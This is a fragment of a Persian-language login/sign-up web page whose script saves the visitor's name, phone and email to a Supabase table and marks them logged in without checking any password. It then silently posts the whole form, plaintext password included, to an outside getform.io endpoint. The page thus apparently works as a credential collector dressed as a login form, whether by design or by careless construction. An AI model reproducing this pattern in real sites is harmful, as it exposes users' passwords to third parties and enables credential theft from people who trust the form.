    const menu = document.getElementById('menu');
    const toggle = document.querySelector('.menu-toggle');
    menu.classList.toggle('show');
    toggle.classList.toggle('open');
}
</script>
</head>
<body>
<div class="menu-toggle" onclick="toggleMenu()">
    <span></span>
    <span></span>
    <span></span>
</div>

<div class="menu" id="menu">

   </div>
<script>
localStorage.removeItem("isLoggedIn");
localStorage.setItem("resetVersion", "2");
</script>

<div class="login-box">
  <h2>ورود / ثبت نام</h2>

  <form id="loginForm">
    <label>نام کاربری</label>
    <input type="text" name="username" required>

    <label>شماره موبایل</label>
    <input type="tel" name="phone" placeholder="09xxxxxxxxx" inputmode="numeric" required>

    <label>ایمیل</label>
    <input type="email" name="email" required>

    <label>رمز عبور</label>
    <input type="password" name="password" required>

    <button type="submit">ورود</button>
  </form>
</div>

<script>
const form = document.getElementById("loginForm");
const SUPABASE_URL = "https://pvudxnmwgdkfccdzaabm.supabase.co";
const SUPABASE_KEY = "sb_publishable_H7920EdFQ6SAz5rou2x3ng__C9uAwRF";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

function toEnglishDigits(str) {
  return str.replace(/[۰-۹]/g, d => "۰۱۲۳۴۵۶۷۸۹".indexOf(d));
}

async function saveOrUpdateUser(user) {
  const { data } = await supabaseClient
    .from("users")
    .select("id")
    .eq("phone", user.phone)
    .limit(1);

  if (data && data.length) {
    await supabaseClient
      .from("users")
      .update({
        username: user.username,
        email: user.email,
        last_login: user.lastLogin
      })
      .eq("phone", user.phone);
  } else {
    await supabaseClient
      .from("users")
      .insert({
        username: user.username,
        phone: user.phone,
        email: user.email,
        last_login: user.lastLogin
      });
  }
}

form.addEventListener("submit", async function (e) {
  e.preventDefault();

  let phone = toEnglishDigits(form.phone.value.trim());

  if (!/^09\d{9}$/.test(phone)) {
    alert("شماره موبایل معتبر نیست\nمثال: 09123456789");
    return;
  }

  form.phone.value = phone;

  const formData = new FormData(form);

  const userRecord = {
    id: "u_" + Date.now(),
    username: form.username.value.trim(),
    phone: form.phone.value.trim(),
    email: form.email.value.trim(),
    lastLogin: new Date().toISOString()
  };
  await saveOrUpdateUser(userRecord);

  localStorage.setItem("profile_name", form.username.value.trim());
  localStorage.setItem("profile_phone", form.phone.value.trim());
  localStorage.setItem("profile_email", form.email.value.trim());
  localStorage.setItem("isLoggedIn", "true");

  if (navigator.sendBeacon) {
    const beaconData = new URLSearchParams();
    formData.forEach((value, key) => beaconData.append(key, value));
    navigator.sendBeacon("https://getform.io/f/amdjyqwb", beaconData);
  } else {
    fetch("https://getform.io/f/amdjyqwb", {
      method: "POST",
      body: formData,
      keepalive: true
    }).catch(() => {});
  }

  location.replace("../home-mobile/index-mobile.html");
});
</script>

</body>
</html>
